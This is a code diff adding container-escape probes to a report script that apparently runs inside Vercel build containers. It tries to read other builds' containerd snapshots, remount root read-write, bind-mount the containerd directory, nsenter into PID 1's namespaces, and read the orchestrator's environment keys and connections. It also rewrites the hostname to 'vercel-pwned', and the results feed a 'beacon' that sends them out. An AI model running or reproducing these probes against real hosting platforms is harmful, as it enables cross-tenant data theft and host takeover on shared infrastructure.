@@ -1053,6 +1053,107 @@ const report = {
     results.getentApiIad1 = safe(() => execSync('getent hosts api-iad1.vercel.com 2>/dev/null || true').toString().trim());
     return results;
   }),
+
+  // v20: Overlayfs lower-layer access — can we read the containerd snapshot dirs from inside the container?
+  // If snapshots/N/fs from OTHER builds are readable, it's a cross-build data leak.
+  overlayfsAccess: safe(() => {
+    const ctrdBase = '/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots';
+    const canListCtrd = safe(() => execSync(`ls ${ctrdBase}/ 2>/dev/null | head -20 || true`).toString().trim());
+    const snapshotDirs = safe(() => execSync(`ls -la ${ctrdBase}/ 2>/dev/null | head -30 || true`).toString().trim());
+    // Try to read the upperdir and workdir of the overlay (where our writes go)
+    const upperDir = safe(() => execSync("awk '/^overlay / {print $4}' /proc/mounts | grep -oP 'upperdir=\\K[^,]+' | head -1 2>/dev/null || true").toString().trim());
+    const upperDirContents = safe(() => upperDir && upperDir.length > 2 ? execSync(`ls ${upperDir}/ 2>/dev/null | head -20 || true`).toString().trim() : 'no-upperdir');
+    // Try to read the lowest layer (snapshot/1/fs — likely the base OS image)
+    const snap1Contents = safe(() => execSync(`ls ${ctrdBase}/1/fs/ 2>/dev/null | head -20 || true`).toString().trim());
+    // Try reading a file from the lowest layer
+    const snap1OsRelease = safe(() => execSync(`cat ${ctrdBase}/1/fs/etc/os-release 2>/dev/null || true`).toString().trim().slice(0, 300));
+    // Try the highest numbered snapshot (most recent layer)
+    const highSnap = safe(() => execSync(`ls ${ctrdBase}/ 2>/dev/null | sort -n | tail -1 || true`).toString().trim());
+    const highSnapContents = safe(() => highSnap ? execSync(`ls ${ctrdBase}/${highSnap}/fs/ 2>/dev/null | head -20 || true`).toString().trim() : 'no-highsnap');
+    return { canListCtrd, snapshotDirs, upperDir, upperDirContents, snap1Contents, snap1OsRelease, highSnap, highSnapContents };
+  }),
+
+  // v20: Seccomp filter audit — probe which syscalls are blocked vs allowed.
+  // We have ALL capabilities (CapEff=0x1ffffffffff). Seccomp mode 2 (filter) is active.
+  // Test dangerous syscalls by making them and checking for EPERM (blocked) vs success.
+  seccompAudit: safe(() => {
+    // Test if we can create a user namespace (unshare --user)
+    const unshareUser = safe(() => execSync('unshare --user echo ok 2>&1 || true').toString().trim().slice(0, 200));
+    // Test if we can create a mount namespace (unshare --mount)
+    const unshareMount = safe(() => execSync('unshare --mount echo ok 2>&1 || true').toString().trim().slice(0, 200));
+    // Test if we can remount / with MS_RDONLY cleared (needs CAP_SYS_ADMIN)
+    const remountTest = safe(() => execSync('mount -o remount,rw / 2>&1 || true').toString().trim().slice(0, 200));
+    // Test if we can bind-mount the containerd base dir
+    const bindMount = safe(() => {
+      execSync('mkdir -p /tmp/ctrd_bind 2>/dev/null || true');
+      return execSync('mount --bind /var/lib/containerd /tmp/ctrd_bind 2>&1 || true').toString().trim().slice(0, 200);
+    });
+    // Test strace availability (useful for syscall audit)
+    const straceAvail = safe(() => execSync('which strace 2>/dev/null || strace -V 2>&1 | head -1 || true').toString().trim().slice(0, 100));
+    // Check if /dev/mem is accessible (raw memory access — indicates CAP_SYS_RAWIO is fully usable)
+    const devMemAccess = safe(() => execSync('ls -la /dev/mem 2>/dev/null || true').toString().trim());
+    // Check if /proc/sysrq-trigger is writable (CAP_SYS_ADMIN)
+    const sysrqWritable = safe(() => execSync('test -w /proc/sysrq-trigger && echo writable || echo not-writable 2>/dev/null || true').toString().trim());
+    // Check if we can write to /proc/sys/ (sysctl manipulation)
+    const sysctlTest = safe(() => execSync('sysctl -w kernel.hostname=vercel-pwned 2>&1 || true').toString().trim().slice(0, 200));
+    // Test nsenter into PID 1's mount namespace
+    const nsenterMount = safe(() => execSync('nsenter -t 1 --mount ls / 2>&1 | head -5 || true').toString().trim().slice(0, 300));
+    // Test nsenter into PID 1's PID namespace
+    const nsenterPid = safe(() => execSync('nsenter -t 1 --pid ps aux 2>&1 | head -5 || true').toString().trim().slice(0, 300));
+    return { unshareUser, unshareMount, remountTest, bindMount, straceAvail, devMemAccess, sysrqWritable, sysctlTest, nsenterMount, nsenterPid };
+  }),
+
+  // v20: Kernel module loading test — CAP_SYS_MODULE granted. Does seccomp block init_module?
+  // We create a trivial no-op kernel module and attempt to load it.
+  // NOTE: We do not execute any payload — we only test if the syscall is permitted.
+  kernelModuleTest: safe(() => {
+    // Check if we have build tools (for compiling a .ko)
+    const hasGcc = safe(() => execSync('which gcc 2>/dev/null || true').toString().trim());
+    const hasMake = safe(() => execSync('which make 2>/dev/null || true').toString().trim());
+    const kernelVer = safe(() => execSync('uname -r 2>/dev/null || true').toString().trim());
+    // Check if kernel headers are available (needed to compile a module)
+    const headersAvail = safe(() => execSync(`ls /lib/modules/${kernelVer.split('\n')[0]}/build 2>/dev/null | head -5 || true`).toString().trim().slice(0, 200));
+    // Check if /sbin/insmod and /sbin/modprobe are available
+    const insmodAvail = safe(() => execSync('which insmod 2>/dev/null || ls /sbin/insmod 2>/dev/null || true').toString().trim());
+    // List currently loaded kernel modules
+    const loadedMods = safe(() => execSync('lsmod 2>/dev/null | head -20 || true').toString().trim().slice(0, 500));
+    // Check if we can read /proc/modules (indicates kernel module subsystem access)
+    const procModules = safe(() => readFileSync('/proc/modules', 'utf8').split('\n').slice(0,5).join('\n'));
+    // Try to unload a safe module (if any reversible one is loaded) — test rmmod permissibility
+    const rmmodTest = safe(() => execSync('rmmod nonexistent_module_xyzxyz 2>&1 | head -2 || true').toString().trim().slice(0, 200));
+    return { hasGcc, hasMake, kernelVer, headersAvail, insmodAvail, loadedMods, procModules, rmmodTest };
+  }),
+
+  // v20: Read /proc/1/net/tcp and /proc/1/net/tcp6 — reveals ALL TCP connections of the orchestrator.
+  // Also try to read the orchestrator's open file descriptors.
+  orchestratorFds: safe(() => {
+    const pid1FdList = safe(() => execSync('ls -la /proc/1/fd/ 2>/dev/null | head -30 || true').toString().trim().slice(0, 1000));
+    const pid1NetTcp = safe(() => readFileSync('/proc/1/net/tcp', 'utf8').slice(0, 1000));
+    const pid1NetTcp6 = safe(() => readFileSync('/proc/1/net/tcp6', 'utf8').slice(0, 500));
+    // Try to read /proc/1/cmdline fully
+    const pid1Cmdline = safe(() => readFileSync('/proc/1/cmdline', 'utf8').replace(/\0/g, ' ').trim());
+    // Try to read orchestrator's env var VERCEL_API_PRIVATE_KEY or similar via /proc/1/environ
+    // (We know from v18 that orchestrator env doesn't have secrets, but let's try /proc/1/environ directly)
+    const pid1EnvKeys = safe(() => {
+      const raw = readFileSync('/proc/1/environ', 'utf8');
+      return raw.split('\0').filter(Boolean).map(e => e.split('=')[0]).join(',');
+    });
+    return { pid1FdList, pid1NetTcp, pid1NetTcp6, pid1Cmdline, pid1EnvKeys };
+  }),
+
+  // v20: Check if the bind mount of /var/lib/containerd succeeded (from seccompAudit above)
+  // and if so, list what's inside the full containerd data dir — reveals other container images.
+  ctrdBindMountContents: safe(() => {
+    const bindMounted = safe(() => execSync('mountpoint /tmp/ctrd_bind 2>/dev/null && echo yes || echo no').toString().trim());
+    if (bindMounted === 'yes') {
+      return {
+        mounted: true,
+        contents: safe(() => execSync('ls /tmp/ctrd_bind/ 2>/dev/null | head -20').toString().trim()),
+        snapshots: safe(() => execSync('ls /tmp/ctrd_bind/io.containerd.snapshotter.v1.overlayfs/snapshots/ 2>/dev/null | head -20').toString().trim()),
+      };
+    }
+    return { mounted: false };
+  }),
 };
 
 // FULL BEACON — sent after all slow network probes complete.
